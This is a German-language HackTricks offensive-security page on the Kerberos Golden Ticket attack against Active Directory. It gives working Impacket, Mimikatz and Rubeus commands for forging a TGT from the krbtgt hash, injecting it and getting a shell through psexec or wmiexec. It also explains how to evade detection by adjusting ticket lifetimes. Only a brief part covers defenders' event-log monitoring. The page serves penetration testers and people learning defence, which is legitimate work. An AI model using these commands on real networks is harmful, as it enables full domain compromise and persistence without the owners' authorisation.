# Goldener Ticket

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) **bei oder folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

## Goldenes Ticket

Ein **Goldenes Ticket**-Angriff besteht darin, ein **legitimes Ticket Granting Ticket (TGT) zu erstellen, das einen beliebigen Benutzer imitiert**, indem der **NTLM-Hash des Active Directory (AD) krbtgt-Kontos** verwendet wird. Diese Technik ist besonders vorteilhaft, da sie den Zugriff auf jeden Dienst oder jede Maschine im Domänenbereich als der imitierte Benutzer ermöglicht. Es ist wichtig zu beachten, dass die Anmeldeinformationen des **krbtgt-Kontos niemals automatisch aktualisiert werden**.

Um den NTLM-Hash des krbtgt-Kontos zu **erhalten**, können verschiedene Methoden angewendet werden. Er kann aus dem **Local Security Authority Subsystem Service (LSASS)-Prozess** oder der **NT Directory Services (NTDS.dit)-Datei** extrahiert werden, die sich auf einem beliebigen Domänencontroller (DC) im Domänenbereich befindet. Darüber hinaus ist die **Ausführung eines DCsync-Angriffs** eine weitere Strategie, um diesen NTLM-Hash zu erhalten, der mit Tools wie dem **lsadump::dcsync-Modul** in Mimikatz oder dem **secretsdump.py-Skript** von Impacket durchgeführt werden kann. Es ist wichtig zu betonen, dass für diese Operationen in der Regel **Domänenadministratorrechte oder ein ähnliches Zugriffsniveau erforderlich** sind.

Obwohl der NTLM-Hash für diesen Zweck als geeignete Methode dient, wird **dringend empfohlen**, Tickets unter Verwendung der Advanced Encryption Standard (AES) Kerberos-Schlüssel (AES128 und AES256) zu **fälschen**, aus Gründen der operationellen Sicherheit.


{% code title="Von Linux aus" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Von Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

Sobald Sie das **Golden Ticket injiziert** haben, können Sie auf die freigegebenen Dateien **(C$)** zugreifen und Dienste und WMI ausführen. Sie können also **psexec** oder **wmiexec** verwenden, um eine Shell zu erhalten (es scheint, dass Sie keine Shell über WinRM erhalten können).

### Umgehung gängiger Erkennungsmethoden

Die häufigsten Möglichkeiten, ein Golden Ticket zu erkennen, bestehen darin, den **Kerberos-Datenverkehr** auf dem Draht zu inspizieren. Standardmäßig **signiert Mimikatz das TGT für 10 Jahre**, was in anschließenden TGS-Anfragen auffällig ist.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Verwenden Sie die Parameter `/startoffset`, `/endin` und `/renewmax`, um den Startversatz, die Dauer und die maximalen Verlängerungen zu steuern (alle in Minuten).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Leider wird die Lebensdauer des TGTs nicht in den 4769er-Logs protokolliert, daher finden Sie diese Informationen nicht in den Windows-Ereignisprotokollen. Was Sie jedoch korrelieren können, ist das Vorhandensein von 4769ern ohne vorherigen 4768er. Es ist nicht möglich, ein TGS ohne ein TGT anzufordern, und wenn kein Eintrag über die Ausstellung eines TGTs vorhanden ist, können wir daraus schließen, dass es offline gefälscht wurde.

Um diese Erkennung zu umgehen, überprüfen Sie die Diamond-Tickets:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Abhilfe

* 4624: Account-Anmeldung
* 4672: Administrator-Anmeldung
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Andere kleine Tricks, die Verteidiger anwenden können, sind das Alarmieren bei 4769ern für sensible Benutzer wie das Standard-Domänenadministrator-Konto.

## Referenzen
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
